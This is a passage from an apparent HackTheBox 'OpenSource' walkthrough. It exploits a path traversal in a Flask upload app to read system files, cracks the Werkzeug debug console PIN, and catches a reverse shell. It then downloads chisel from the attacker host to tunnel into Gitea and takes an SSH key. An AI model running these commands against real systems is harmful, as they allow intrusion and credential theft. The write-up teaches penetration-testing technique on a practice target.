+        <span class="mtk1">f</span> <span class="mtk5">=</span> <span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">files</span><span class="mtk1">[</span><span class="mtk4">'file'</span><span class="mtk1">]</span>
+        <span class="mtk1">file_name</span> <span class="mtk5">=</span> <span class="mtk8">get_file_name</span><span class="mtk1">(</span><span class="mtk1">f</span><span class="mtk1">.</span><span class="mtk1">filename</span><span class="mtk1">)</span>
+        <span class="mtk1">file_path</span> <span class="mtk5">=</span> <span class="mtk8 mtku">os</span><span class="mtk1">.</span><span class="mtk1">path</span><span class="mtk1">.</span><span class="mtk8">join</span><span class="mtk1">(</span><span class="mtk8 mtku">os</span><span class="mtk1">.</span><span class="mtk8">getcwd</span><span class="mtk1">(),</span> <span class="mtk4">"public"</span><span class="mtk1">,</span> <span class="mtk4">"uploads"</span><span class="mtk1">,</span> <span class="mtk1">file_name</span><span class="mtk1">)</span>
+        <span class="mtk1">f</span><span class="mtk1">.</span><span class="mtk8">save</span><span class="mtk1">(</span><span class="mtk1">file_path</span><span class="mtk1">)</span>
+        <span class="mtk5">return</span> <span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">'success.html'</span><span class="mtk1">,</span> <span class="mtk9 mtki">file_url</span><span class="mtk5">=</span><span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">host_url</span> <span class="mtk5">+</span> <span class="mtk4">"uploads/"</span> <span class="mtk5">+</span> <span class="mtk1">file_name</span><span class="mtk1">)</span>  
+    <span class="mtk5">return</span> <span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">'upload.html'</span><span class="mtk1">)</span>
+
+
+<span class="mtk8">@</span><span class="mtk1">app</span><span class="mtk8">.</span><span class="mtk8">route</span><span class="mtk1">(</span><span class="mtk4">'/uploads/&lt;path:path&gt;'</span><span class="mtk1">)</span>
+<span class="mtk7 mtki">def</span> <span class="mtk8">send_report</span><span class="mtk1">(</span><span class="mtk9 mtki">path</span><span class="mtk1">):</span>
+    <span class="mtk9 mtki">path</span> <span class="mtk5">=</span> <span class="mtk8">get_file_name</span><span class="mtk1">(</span><span class="mtk9 mtki">path</span><span class="mtk1">)</span>
+    <span class="mtk5">return</span> <span class="mtk8">send_file</span><span class="mtk1">(</span><span class="mtk8 mtku">os</span><span class="mtk1">.</span><span class="mtk1">path</span><span class="mtk1">.</span><span class="mtk8">join</span><span class="mtk1">(</span><span class="mtk8 mtku">os</span><span class="mtk1">.</span><span class="mtk8">getcwd</span><span class="mtk1">(),</span> <span class="mtk4">"public"</span><span class="mtk1">,</span> <span class="mtk4">"uploads"</span><span class="mtk1">,</span> <span class="mtk9 mtki">path</span><span class="mtk1">))</span>
+</code></pre></div><p>There is an interesting endpoint at <code>/uploads</code>, which takes a path and prints out the indicated file. However, there is some sanitization on the function <code>get_file_name</code>, which is in <code>utils.py</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">import</span> <span class="mtk8 mtku">time</span>
+
+
+<span class="mtk7 mtki">def</span> <span class="mtk8">current_milli_time</span><span class="mtk1">():</span>
+    <span class="mtk5">return</span> <span class="mtk8">round</span><span class="mtk1">(</span><span class="mtk8 mtku">time</span><span class="mtk1">.</span><span class="mtk8">time</span><span class="mtk1">()</span> <span class="mtk5">*</span> <span class="mtk6">1000</span><span class="mtk1">)</span>
+
+
+<span class="mtk4">"""</span>
+<span class="mtk4">Pass</span> <span class="mtk4">filename</span> <span class="mtk4">and</span> <span class="mtk4">return</span> <span class="mtk4">a</span> <span class="mtk4">secure</span> <span class="mtk4">version,</span> <span class="mtk4">which</span> <span class="mtk4">can</span> <span class="mtk4">then</span> <span class="mtk4">safely</span> <span class="mtk4">be</span> <span class="mtk4">stored</span> <span class="mtk4">on</span> <span class="mtk4">a</span> <span class="mtk4">regular</span> <span class="mtk4">file</span> <span class="mtk4">system.</span>
+<span class="mtk4">"""</span>
+
+
+<span class="mtk7 mtki">def</span> <span class="mtk8">get_file_name</span><span class="mtk1">(</span><span class="mtk9 mtki">unsafe_filename</span><span class="mtk1">):</span>
+    <span class="mtk5">return</span> <span class="mtk8">recursive_replace</span><span class="mtk1">(</span><span class="mtk9 mtki">unsafe_filename</span><span class="mtk1">,</span> <span class="mtk4">"../"</span><span class="mtk1">,</span> <span class="mtk4">""</span><span class="mtk1">)</span>
+
+
+<span class="mtk4">"""</span>
+<span class="mtk5">TODO</span><span class="mtk4">:</span> <span class="mtk4">get</span> <span class="mtk4">unique</span> <span class="mtk4">filename</span>
+<span class="mtk4">"""</span>
+
+
+<span class="mtk7 mtki">def</span> <span class="mtk8">get_unique_upload_name</span><span class="mtk1">(</span><span class="mtk9 mtki">unsafe_filename</span><span class="mtk1">):</span>
+    <span class="mtk1">spl</span> <span class="mtk5">=</span> <span class="mtk9 mtki">unsafe_filename</span><span class="mtk1">.rsplit(</span><span class="mtk4">"</span><span class="mtk6">\\</span><span class="mtk4">."</span><span class="mtk1">,</span> <span class="mtk6">1</span><span class="mtk1">)</span>
+    <span class="mtk1">file_name</span> <span class="mtk5">=</span> <span class="mtk1">spl</span><span class="mtk1">[</span><span class="mtk6">0</span><span class="mtk1">]</span>
+    <span class="mtk1">file_extension</span> <span class="mtk5">=</span> <span class="mtk1">spl</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">]</span>
+    <span class="mtk5">return</span> <span class="mtk8">recursive_replace</span><span class="mtk1">(</span><span class="mtk1">file_name</span><span class="mtk1">,</span> <span class="mtk4">"../"</span><span class="mtk1">,</span> <span class="mtk4">""</span><span class="mtk1">)</span> <span class="mtk5">+</span> <span class="mtk4">"_"</span> <span class="mtk5">+</span> <span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk8">current_milli_time</span><span class="mtk1">())</span> <span class="mtk5">+</span> <span class="mtk4">"."</span> <span class="mtk5">+</span> <span class="mtk1">file_extension</span>  
+
+
+<span class="mtk4">"""</span>
+<span class="mtk4">Recursively</span> <span class="mtk4">replace</span> <span class="mtk4">a</span> <span class="mtk4">pattern</span> <span class="mtk4">in</span> <span class="mtk4">a</span> <span class="mtk4">string</span>
+<span class="mtk4">"""</span>
+
+
+<span class="mtk7 mtki">def</span> <span class="mtk8">recursive_replace</span><span class="mtk1">(</span><span class="mtk9 mtki">search</span><span class="mtk1">,</span> <span class="mtk9 mtki">replace_me</span><span class="mtk1">,</span> <span class="mtk9 mtki">with_me</span><span class="mtk1">):</span>
+    <span class="mtk5">if</span> <span class="mtk9 mtki">replace_me</span> <span class="mtk5">not</span> <span class="mtk5">in</span> <span class="mtk9 mtki">search</span><span class="mtk1">:</span>
+                <span class="mtk5">return</span> <span class="mtk9 mtki">search</span>
+    <span class="mtk5">return</span> <span class="mtk8">recursive_replace</span><span class="mtk1">(</span><span class="mtk9 mtki">search</span><span class="mtk1">.replace(</span><span class="mtk9 mtki">replace_me</span><span class="mtk1">,</span> <span class="mtk9 mtki">with_me</span><span class="mtk1">),</span> <span class="mtk9 mtki">replace_me</span><span class="mtk1">,</span> <span class="mtk9 mtki">with_me</span><span class="mtk1">)</span>
+</code></pre></div><p>As we can see, the developer uses a recursive approach to remove directory traversal attempts. For instance, <code>"....//"</code> will be transformed to <code>"../"</code> and finally it will become an empty string.</p><p>However, there is something left behind, since we can use a single <code>../</code> and then put a file like <code>/etc/passwd</code>. The problem is that <code>get_file_name</code> will return <code>"/etc/passwd"</code>, and <code>os.path.join</code> will result in <code>/etc/passwd</code> because it won&rsquo;t be able to join an absolute path with the current working directory, <code>public</code> and <code>uploads</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk8">@</span><span class="mtk1">app</span><span class="mtk8">.</span><span class="mtk8">route</span><span class="mtk1">(</span><span class="mtk4">'/uploads/&lt;path:path&gt;'</span><span class="mtk1">)</span>
+<span class="mtk7 mtki">def</span> <span class="mtk8">send_report</span><span class="mtk1">(</span><span class="mtk9 mtki">path</span><span class="mtk1">):</span>
+    <span class="mtk9 mtki">path</span> <span class="mtk5">=</span> <span class="mtk8">get_file_name</span><span class="mtk1">(</span><span class="mtk9 mtki">path</span><span class="mtk1">)</span>
+    <span class="mtk5">return</span> <span class="mtk8">send_file</span><span class="mtk1">(</span><span class="mtk8 mtku">os</span><span class="mtk1">.</span><span class="mtk1">path</span><span class="mtk1">.</span><span class="mtk8">join</span><span class="mtk1">(</span><span class="mtk8 mtku">os</span><span class="mtk1">.</span><span class="mtk8">getcwd</span><span class="mtk1">(),</span> <span class="mtk4">"public"</span><span class="mtk1">,</span> <span class="mtk4">"uploads"</span><span class="mtk1">,</span> <span class="mtk9 mtki">path</span><span class="mtk1">))</span>  
+</code></pre></div><p>Here is a simple proof of concept, using <code>%2e</code> as <code>.</code> (URL encoding):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.164/uploads/%2e%2e//etc/passwd
+root:x:0:0:root:/root:/bin/ash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin  
+operator:x:11:0:operator:/root:/sbin/nologin
+man:x:13:15:man:/usr/man:/sbin/nologin
+postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
+squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
+xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+cyrus:x:85:12::/usr/cyrus:/sbin/nologin
+vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+</code></pre></div><p>So we have a way to read files from the server (Directory Path Traversal). At this point, we can try to get the needed information in order to calculate the Werkzeug PIN for <code>/console</code> and run arbitrary Python code.</p><h2 id="access-to-console">Access to console</h2><p>Going back to the <a href="https://www.daehee.com/werkzeug-console-pin-exploit/">Werkzeug PIN exploit explanation</a>, we need:</p><ul><li>The user that runs the server.</li><li>The absolute path for <code>app.py</code> in <code>flask</code> directory.</li><li>The MAC address of the machine (in hexadecimal).</li><li>The machine ID, which is stored in <code>/etc/machine-id</code> or in <code>/proc/sys/kernel/random/boot_id</code>.</li></ul><p>The user that runs the server must be <code>root</code>, since there is no other user in <code>/etc/passwd</code>. Moreover, the machine is a Docker container, because of the random hostname:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.164/uploads/%2e%2e//etc/hostname  
+ef4008903997
+</code></pre></div><p>The <code>app.py</code> file must be inside <code>/usr/local/lib/python3.5/dist-packages/flask/app.py</code> (according to the exploit), but it is not there. Maybe, the version of Python is newer, we find the right path when causing an error (namely, clicking &ldquo;Upload&rdquo; without a file), because <code>debug</code> mode is active:</p><p><img src="/images/HTB/OpenSource/OpenSource-error.png" alt="OpenSource error"></p><p>So this is the correct path: <code>/usr/local/lib/python3.10/site-packages/flask/app.py</code>.</p><p>For the MAC address, we know it must be in <code>/sys/class/net/&lt;device id>/address</code>. We can guess that the device is <code>eth0</code>, which is very common. And indeed it is, we have the MAC address:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.164/uploads/%2e%2e//sys/class/net/eth0/address  
+02:42:ac:11:00:06
+curl: (18) transfer closed with 4078 bytes remaining to read
+</code></pre></div><p>The exploit explanation says to use <code>/proc/net/arp</code> to see available network interfaces, but we don&rsquo;t get a response using <code>curl</code>. The problem is that the <code>Content-Length</code> header is set to <code>0</code>, so <code>curl</code> stops reading. Using verbose mode, there is a warning:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.164/uploads/%2e%2e//proc/net/arp -v
+*   Trying 10.10.11.164:80...
+* Connected to 10.10.11.164 (10.10.11.164) port 80 (#0)
+&gt; GET /uploads/%2e%2e//proc/net/arp HTTP/1.1
+&gt; Host: 10.10.11.164
+&gt; User-Agent: curl/7.84.0
+&gt; Accept: */*
+&gt;
+* Mark bundle as not supporting multiuse
+&lt; HTTP/1.1 200 OK
+&lt; Server: Werkzeug/2.1.2 Python/3.10.3
+&lt; Date: Tue, 05 Jul 2022 01:13:04 GMT
+&lt; Content-Disposition: inline; filename=arp
+&lt; Content-Type: application/octet-stream
+&lt; Content-Length: 0
+&lt; Last-Modified: Tue, 05 Jul 2022 01:13:04 GMT
+&lt; Cache-Control: no-cache
+&lt; ETag: "1656983584.1326792-0-548799692"
+&lt; Date: Tue, 05 Jul 2022 01:13:04 GMT
+&lt; Connection: close
+&lt;
+* Excess found: excess = 156 url = /uploads/%2e%2e//proc/net/arp (zero-length body)  
+* Closing connection 0
+</code></pre></div><p>We can use a raw socket connection to see the whole response:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> <span class="code-dark-yellow">'GET /uploads/%2e%2e//proc/net/arp HTTP/1.1'</span> | <span class="code-dark-green">nc</span> 10.10.11.164 80
+HTTP/1.1 200 OK
+Server: Werkzeug/2.1.2 Python/3.10.3
+Date: Tue, 05 Jul 2022 01:16:32 GMT
+Content-Disposition: inline; filename=arp
+Content-Type: application/octet-stream
+Content-Length: 0
+Last-Modified: Tue, 05 Jul 2022 01:16:32 GMT
+Cache-Control: no-cache
+ETag: "1656983792.5126793-0-548799692"
+Date: Tue, 05 Jul 2022 01:16:32 GMT
+Connection: close
+
+IP address       HW type     Flags       HW address            Mask     Device  
+172.17.0.1       0x1         0x2         02:42:b6:73:5f:b6     *        eth0
+</code></pre></div><p>With <code>sed</code>, we are able to show only the response body:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> <span class="code-dark-yellow">'GET /uploads/%2e%2e//proc/net/arp HTTP/1.1'</span> | <span class="code-dark-green">nc</span> 10.10.11.164 80 | <span class="code-dark-green">echo</span> <span class="code-dark-yellow">'13,$p'</span>  
+IP address       HW type     Flags       HW address            Mask     Device
+172.17.0.1       0x1         0x2         02:42:b6:73:5f:b6     *        eth0
+</code></pre></div><p>We can use this function called <code>read_file</code> to wrap the above command:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-yellow">function</span> read_file<span class="code-dark-yellow">()</span> <span class="code-dark-yellow">{</span> <span class="code-dark-green">echo</span> <span class="code-dark-yellow">"GET /uploads/%2e%2e/<span class="code-dark-cyan">$1</span> HTTP/1.1"</span> | <span class="code-dark-green">nc</span> 10.10.11.164 80 | <span class="code-dark-green">sed</span> -n <span class="code-dark-yellow">'13,$p'</span>; <span class="code-dark-yellow">}</span>  
+
+<span class="code-cyan">$</span> <span class="code-dark-green">read_file</span> /proc/net/arp
+IP address       HW type     Flags       HW address            Mask     Device
+172.17.0.1       0x1         0x2         02:42:b6:73:5f:b6     *        eth0
+</code></pre></div><p>And there we see the <code>eth0</code> interface, and also its corresponding MAC address. To format it as a decimal number, we can get rid of the colons and add <code>0x</code> (because it is hexadecimal):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
+&gt;&gt;&gt; 0x0242ac110006  
+2485377892358
+&gt;&gt;&gt; exit()
+</code></pre></div><p>Finally, we need the machine ID, but <code>/etc/machine-id</code> does not exist. Therefore, we must check <code>/proc/sys/kernel/random/boot_id</code>, according to the exploit:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">read_file</span> /proc/sys/kernel/random/boot_id  
+0abba663-d46d-4efb-8e26-158c2e4cb6c2
+</code></pre></div><p>Now we can set the parameters in the Python exploit and get the PIN for the console:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">pin_exploit.py</span>  
+101-705-652
+</code></pre></div><p>If the PIN does not work, we must add a value from <code>/proc/self/cgroups</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">read_file</span> /proc/self/cgroup
+12:freezer:/docker/1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb
+11:rdma:/
+10:hugetlb:/docker/1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb
+9:pids:/docker/1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb
+8:memory:/docker/1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb
+7:cpuset:/docker/1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb
+6:net_cls,net_prio:/docker/1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb  
+5:devices:/docker/1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb
+4:blkio:/docker/1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb
+3:cpu,cpuacct:/docker/1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb
+2:perf_event:/docker/1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb
+1:name=systemd:/docker/1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb
+0::/system.slice/snap.docker.dockerd.service
+</code></pre></div><p>Specifically, we must append</p><p><code>1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb</code></p><p>to the machine ID (<code>0abba663-d46d-4efb-8e26-158c2e4cb6c2</code>), and run the exploit again:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">pin_exploit.py</span>  
+115-017-757
+</code></pre></div><p>If it still does not work, we can change from MD5 hash to SHA1 or vice versa.</p><p>Finally, we will get a valid PIN and enter the console.</p><p><img src="/images/HTB/OpenSource/OpenSource-console-access.png" alt="OpenSource console access"></p><p>The first thing to notice is that the container does not have Bash, but <code>nc</code>, so we must use a specific reverse shell payload to access the system. This is the command (taken from <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey.net</a>):</p><p><img src="/images/HTB/OpenSource/OpenSource-console-command.png" alt="OpenSource console commands"></p><p>And we get the connection back:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.11.164.
+Ncat: Connection from 10.10.11.164:42081.
+/bin/sh: can't access tty; job control turned off
+/app # python3 -c 'import pty; pty.spawn("/bin/sh")'  
+/app # ^Z
+zsh: suspended  ncat -nlvp 4444
+
+<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
+[1]  + continued  ncat -nlvp 4444
+                                 reset xterm
+/app # export TERM=xterm
+/app # stty rows 50 columns 158
+</code></pre></div><h2 id="container-enumeration">Container enumeration</h2><p>We can confirm that we are in a Docker container (there is a file called <code>.dockerenv</code> and the IP address is <code>172.17.0.6</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"></span>/app # ls -la /
+total 68
+drwxr-xr-x    1 root     root          4096 Jul  4 01:27 <span class="code-blue">.</span>
+drwxr-xr-x    1 root     root          4096 Jul  4 01:27 <span class="code-blue">..</span>
+-rwxr-xr-x    1 root     root             0 Jul  4 01:27 <span class="code-green">.dockerenv</span>
+drwxr-xr-x    1 root     root          4096 May  4 16:35 <span class="code-blue">app</span>
+drwxr-xr-x    1 root     root          4096 Mar 17 05:52 <span class="code-blue">bin</span>
+drwxr-xr-x    5 root     root           340 Jul  4 01:27 <span class="code-blue">dev</span>
+drwxr-xr-x    1 root     root          4096 Jul  4 01:27 <span class="code-blue">etc</span>
+drwxr-xr-x    2 root     root          4096 May  4 16:35 <span class="code-blue">home</span>
+drwxr-xr-x    1 root     root          4096 May  4 16:35 <span class="code-blue">lib</span>
+drwxr-xr-x    5 root     root          4096 May  4 16:35 <span class="code-blue">media</span>
+drwxr-xr-x    2 root     root          4096 May  4 16:35 <span class="code-blue">mnt</span>
+drwxr-xr-x    2 root     root          4096 May  4 16:35 <span class="code-blue">opt</span>
+dr-xr-xr-x  230 root     root             0 Jul  4 01:27 <span class="code-blue">proc</span>
+drwx------    1 root     root          4096 Jul  4 01:53 <span class="code-blue">root</span>
+drwxr-xr-x    1 root     root          4096 Jul  4 01:27 <span class="code-blue">run</span>
+drwxr-xr-x    1 root     root          4096 Mar 17 05:52 <span class="code-blue">sbin</span>
+drwxr-xr-x    2 root     root          4096 May  4 16:35 <span class="code-blue">srv</span>
+dr-xr-xr-x   13 root     root             0 Jul  4 01:27 <span class="code-blue">sys</span>
+drwxrwxrwt    1 root     root          4096 Jul  4 01:52 <span class="code-blue">tmp</span>
+drwxr-xr-x    1 root     root          4096 May  4 16:35 <span class="code-blue">usr</span>
+drwxr-xr-x    1 root     root          4096 May  4 16:35 <span class="code-blue">var</span>
+/app # ip addr
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+12: eth0@if13: &lt;BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN&gt; mtu 1500 qdisc noqueue state UP  
+    link/ether 02:42:ac:11:00:06 brd ff:ff:ff:ff:ff:ff
+    inet 172.17.0.6/16 brd 172.17.255.255 scope global eth0
+       valid_lft forever preferred_lft forever
+</code></pre></div><p>Here, we must recall that port 3000 was filtered on the machine, maybe we are able to access this port from the container, using network <code>172.17.0.0/16</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"></span>/app # wget -qO- 172.17.0.1:3000 | head
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en-US" class="theme-"&gt;
+&lt;head&gt;
+        &lt;meta charset="utf-8"&gt;
+        &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;
+        &lt;title&gt; Gitea: Git with a cup of tea&lt;/title&gt;
+        &lt;link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL29wZW5zb3VyY2UuaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9vcGVuc291cmNlLmh0YjozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ4NTEyIn0seyJzcmMiOiJodHRwOi8vb3BlbnNvdXJjZS5odGI6MzAwMC9hc3NldHMvaW1nL2xvZ28uc3ZnIiwidHlwZSI6ImltYWdlL3N2Zyt4bWwiLCJzaXplcyI6IjUxMng1MTIifV19"/&gt;  
+        &lt;meta name="theme-color" content="#6cc644"&gt;
+        &lt;meta name="default-theme" content="auto" /&gt;
+        &lt;meta name="author" content="Gitea - Git with a cup of tea" /&gt;
+</code></pre></div><p>There it is. To access this page from a browser, we must use <a href="https://github.com/jpillora/chisel"><code>chisel</code></a> to do port forwarding.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -m http.server
+Serving HTTP on :: port 8000 (http://[::]:8000/) ...
+::ffff:10.10.11.164 - - [] "GET /chisel HTTP/1.1" 200 -  
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">/app # cd /tmp
+/tmp # wget 10.10.17.44:8000/chisel -qO .chisel  
+/tmp # chmod +x .chisel
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./chisel</span> server -p 1234 --reverse
+server: Reverse tunnelling enabled
+server: Fingerprint FX/QSjEzTqjMotC2jW9Y5lk6gKLr5IlopGmfEndFGhU=
+server: Listening on http://0.0.0.0:1234
+server: session#1: tun: proxy#R:3000=&gt;172.17.0.1:3000: Listening  
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">/tmp # ./.chisel client 10.10.17.44:1234 R:3000:172.17.0.1:3000  
+client: Connecting to ws://10.10.17.44:1234
+client: Connected (Latency 81.99391ms)
+</code></pre></div><p>Now we can go to <code>http://127.0.0.1:3000</code> and we see a Gitea web application:</p><p><img src="/images/HTB/OpenSource/OpenSource-gitea.png" alt="Opensource Gitea"></p><p>This is an open-source Git repository manager (like GitHub). We can list the registered users:</p><p><img src="/images/HTB/OpenSource/OpenSource-gitea-users.png" alt="Opensource Gitea users"></p><p>There&rsquo;s one called <code>dev01</code>&mldr; Let&rsquo;s try to login using the credentials found earlier:</p><p><img src="/images/HTB/OpenSource/OpenSource-gitea-login.png" alt="Opensource Gitea login"></p><p>And we are in:</p><p><img src="/images/HTB/OpenSource/OpenSource-gitea-dev01.png" alt="Opensource Gitea dev01"></p><p>There is a repository called <code>home-backup</code>, and it contains files that should be the user&rsquo;s home directory:</p><p><img src="/images/HTB/OpenSource/OpenSource-gitea-home-backup.png" alt="Opensource Gitea home-backup"></p><p>Let&rsquo;s go to <code>.ssh</code> and grab the <code>id_rsa</code> private SSH key:</p><p><img src="/images/HTB/OpenSource/OpenSource-gitea-ssh.png" alt="Opensource Gitea .ssh"></p><p><img src="/images/HTB/OpenSource/OpenSource-gitea-id_rsa.png" alt="Opensource Gitea id_rsa"></p><p>One way to get the files is use <code>git</code>, via the tunnel:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">git</span> clone http://127.0.0.1:3000/dev01/home-backup.git
+Clonando en 'home-backup'...
+Username for 'http://127.0.0.1:3000': dev01
+Password for 'http://dev01@127.0.0.1:3000':
+remote: Counting objects: 11, done.
+remote: Compressing objects: 100% (8/8), done.
+remote: Total 11 (delta 0), reused 0 (delta 0)
+Desempaquetando objetos: 100% (11/11), 5.77 KiB | 1.44 MiB/s, listo.  
